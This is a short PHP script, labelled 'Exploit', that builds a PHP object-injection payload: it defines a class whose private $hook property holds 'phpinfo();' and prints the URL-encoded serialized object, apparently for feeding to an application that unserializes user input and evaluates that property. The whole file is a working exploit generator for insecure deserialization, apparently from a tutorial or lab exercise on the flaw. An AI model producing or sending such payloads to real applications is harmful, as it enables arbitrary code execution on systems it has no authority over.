<?php

// Exploit
class Example2
{
    private $hook = "phpinfo();";
}

print urlencode(serialize(new Example2));
